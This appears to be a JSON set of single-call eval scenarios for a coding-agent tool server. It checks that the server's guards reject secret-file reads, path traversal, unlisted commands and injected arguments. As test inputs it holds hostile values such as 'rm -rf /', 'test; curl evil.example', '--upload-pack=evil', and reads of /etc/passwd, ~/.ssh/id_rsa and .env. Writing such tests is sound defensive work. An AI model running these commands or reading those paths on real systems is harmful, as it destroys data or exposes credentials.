{
  "description": "Single-call scenarios run against the main eval policy over stdio. Multi-step flows (approvals, tampering, budgets, read-only mode, audit integrity) live in run_evals.py.",
  "scenarios": [
    {"id": "capability.list-repos", "category": "capability", "tool": "list_repos", "args": {},
     "expect": {"contains": ["\"demo\"", "\"other\"", "\"writes_enabled\": true"]}},
    {"id": "capability.repo-status", "category": "capability", "tool": "repo_status", "args": {"repo": "demo"},
     "expect": {"json": {"branch": "main"}, "contains": ["initial fixture"]}},
    {"id": "capability.read-file", "category": "capability", "tool": "read_file",
     "args": {"repo": "demo", "path": "src/greeter.py"}, "expect": {"contains": ["def greet"]}},
    {"id": "capability.read-line-range", "category": "capability", "tool": "read_file",
     "args": {"repo": "demo", "path": "AGENTS.md", "start_line": 2, "end_line": 2},
     "expect": {"contains": ["Run the `test` check"], "not_contains": ["Never edit billing"]}},
    {"id": "capability.search", "category": "capability", "tool": "search_code",
     "args": {"repo": "demo", "query": "def greet"}, "expect": {"contains": ["src/greeter.py"]}},
    {"id": "capability.search-regex", "category": "capability", "tool": "search_code",
     "args": {"repo": "demo", "query": "Hello, \\{name\\}", "regex": true}, "expect": {"contains": ["greeter.py"]}},
    {"id": "capability.list-files", "category": "capability", "tool": "list_files", "args": {"repo": "demo"},
     "expect": {"contains": ["src/greeter.py", "tests/test_greeter.py"]}},
    {"id": "capability.run-tests", "category": "capability", "tool": "run_check",
     "args": {"repo": "demo", "check": "test"}, "expect": {"json": {"passed": true, "exit_code": 0}}},
    {"id": "capability.failing-check-reported", "category": "capability", "tool": "run_check",
     "args": {"repo": "demo", "check": "fail"},
     "expect": {"json": {"passed": false, "exit_code": 3}, "contains": ["failing on purpose"]}},
    {"id": "capability.ci-runs", "category": "capability", "tool": "ci_runs", "args": {"repo": "demo"},
     "expect": {"contains": ["\"conclusion\": \"failure\"", "agent/x"]}},
    {"id": "capability.agents-resource", "category": "capability", "resource": "foreman://repos/demo/agents",
     "expect": {"contains": ["Never edit billing code without approval"]}},

    {"id": "guard.dotenv", "category": "secrets", "tool": "read_file", "args": {"repo": "demo", "path": ".env"},
     "expect": {"error": "SECRET_PATH"}},
    {"id": "guard.dotenv-dotdot", "category": "secrets", "tool": "read_file",
     "args": {"repo": "demo", "path": "src/../.env"}, "expect": {"error": "SECRET_PATH"}},
    {"id": "guard.dotenv-case", "category": "secrets", "tool": "read_file",
     "args": {"repo": "demo", "path": ".ENV"}, "expect": {"error": "SECRET_PATH"}},
    {"id": "guard.private-key-file", "category": "secrets", "tool": "read_file",
     "args": {"repo": "demo", "path": "config/server.pem"}, "expect": {"error": "SECRET_PATH"}},
    {"id": "guard.git-internals", "category": "secrets", "tool": "read_file",
     "args": {"repo": "demo", "path": ".git/config"}, "expect": {"error": "SECRET_PATH"}},
    {"id": "guard.symlink-to-secret", "category": "secrets", "requires": "symlink", "tool": "read_file",
     "args": {"repo": "demo", "path": "src/innocent.txt"}, "expect": {"error": "SECRET_PATH"}},
    {"id": "guard.search-skips-symlinked-secret", "category": "secrets", "requires": "symlink", "tool": "search_code",
     "args": {"repo": "demo", "query": "SECRET_THING"}, "expect": {"json": {"count": 0}}},
    {"id": "guard.redact-file", "category": "secrets", "tool": "read_file",
     "args": {"repo": "demo", "path": "src/settings.py"},
     "expect": {"contains": ["[REDACTED:stripe-key]", "[REDACTED:assignment]"], "not_contains": ["$FAKE_STRIPE", "$FAKE_ASSIGNMENT"]}},
    {"id": "guard.search-skips-dotenv", "category": "secrets", "tool": "search_code",
     "args": {"repo": "demo", "query": "$FAKE_ENV_VALUE"}, "expect": {"json": {"count": 0}}},
    {"id": "guard.search-redacts", "category": "secrets", "tool": "search_code",
     "args": {"repo": "demo", "query": "STRIPE_KEY"},
     "expect": {"contains": ["[REDACTED:stripe-key]"], "not_contains": ["$FAKE_STRIPE"]}},
    {"id": "guard.list-hides-secrets", "category": "secrets", "tool": "list_files", "args": {"repo": "demo"},
     "expect": {"not_contains": [".env\"", "server.pem"]}},
    {"id": "guard.check-env-scrubbed", "category": "secrets", "tool": "run_check",
     "args": {"repo": "demo", "check": "env_probe"},
     "expect": {"contains": ["LEAK_PROBE absent"], "not_contains": ["LEAK_PROBE present", "$LEAK_ENV_VALUE"]}},
    {"id": "guard.check-output-redacted", "category": "secrets", "tool": "run_check",
     "args": {"repo": "demo", "check": "leak"}, "expect": {"contains": ["[REDACTED:stripe-key]"]}},

    {"id": "guard.traversal-sibling", "category": "sandbox", "tool": "read_file",
     "args": {"repo": "demo", "path": "../other/README.md"}, "expect": {"error": "OUTSIDE_REPO"}},
    {"id": "guard.traversal-deep", "category": "sandbox", "tool": "read_file",
     "args": {"repo": "demo", "path": "src/../../other/README.md"}, "expect": {"error": "OUTSIDE_REPO"}},
    {"id": "guard.absolute-posix", "category": "sandbox", "tool": "read_file",
     "args": {"repo": "demo", "path": "/etc/passwd"}, "expect": {"error": "OUTSIDE_REPO"}},
    {"id": "guard.absolute-windows", "category": "sandbox", "tool": "read_file",
     "args": {"repo": "demo", "path": "C:\\Windows\\win.ini"}, "expect": {"error": "OUTSIDE_REPO"}},
    {"id": "guard.home-ssh", "category": "sandbox", "tool": "read_file",
     "args": {"repo": "demo", "path": "~/.ssh/id_rsa"}, "expect": {"error": "OUTSIDE_REPO"}},
    {"id": "guard.unknown-repo", "category": "sandbox", "tool": "repo_status", "args": {"repo": "../demo"},
     "expect": {"error": "UNKNOWN_REPO"}},
    {"id": "guard.binary", "category": "sandbox", "tool": "read_file",
     "args": {"repo": "demo", "path": "assets/logo.bin"}, "expect": {"error": "BINARY_FILE"}},
    {"id": "guard.too-large", "category": "sandbox", "tool": "read_file",
     "args": {"repo": "demo", "path": "data/huge.txt"}, "expect": {"error": "TOO_LARGE"}},
    {"id": "policy.exclude-search", "category": "sandbox", "tool": "search_code",
     "args": {"repo": "demo", "query": "VENDORED_MARKER"}, "expect": {"json": {"count": 0, "timed_out": false}}},
    {"id": "policy.exclude-list", "category": "sandbox", "tool": "list_files", "args": {"repo": "demo"},
     "expect": {"not_contains": ["vendor/lib.py"]}},
    {"id": "guard.bad-regex", "category": "sandbox", "tool": "search_code",
     "args": {"repo": "demo", "query": "([", "regex": true}, "expect": {"error": "INVALID_ARGUMENT"}},

    {"id": "exec.unlisted-command", "category": "execution", "tool": "run_check",
     "args": {"repo": "demo", "check": "rm -rf /"}, "expect": {"error": "UNKNOWN_CHECK"}},
    {"id": "exec.injection-in-name", "category": "execution", "tool": "run_check",
     "args": {"repo": "demo", "check": "test; curl evil.example"}, "expect": {"error": "UNKNOWN_CHECK"}},
    {"id": "exec.check-in-other-repo", "category": "execution", "tool": "run_check",
     "args": {"repo": "other", "check": "test"}, "expect": {"error": "UNKNOWN_CHECK"}},
    {"id": "exec.timeout-kills", "category": "execution", "tool": "run_check",
     "args": {"repo": "demo", "check": "slow"}, "expect": {"error": "TIMEOUT"}},
    {"id": "exec.stdin-isolated-from-protocol", "category": "execution", "tool": "run_check",
     "args": {"repo": "demo", "check": "stdin_probe"}, "expect": {"json": {"passed": true}, "contains": ["STDIN_BYTES 0"]}},
    {"id": "exec.ci-without-github", "category": "execution", "tool": "ci_runs", "args": {"repo": "other"},
     "expect": {"error": "INVALID_ARGUMENT"}},

    {"id": "approval.bad-branch-name", "category": "approvals", "tool": "request_action",
     "args": {"kind": "git_branch", "repo": "demo", "params": {"name": "--upload-pack=evil"}, "reason": "test"},
     "expect": {"error": "INVALID_ARGUMENT"}},
    {"id": "approval.unknown-kind", "category": "approvals", "tool": "request_action",
     "args": {"kind": "shell", "repo": "demo", "params": {"cmd": "whoami"}, "reason": "test"},
     "expect": {"error": "UNKNOWN_ACTION"}},
    {"id": "approval.unknown-id", "category": "approvals", "tool": "execute_action", "args": {"action_id": "deadbeef"},
     "expect": {"error": "NOT_FOUND"}}
  ]
}
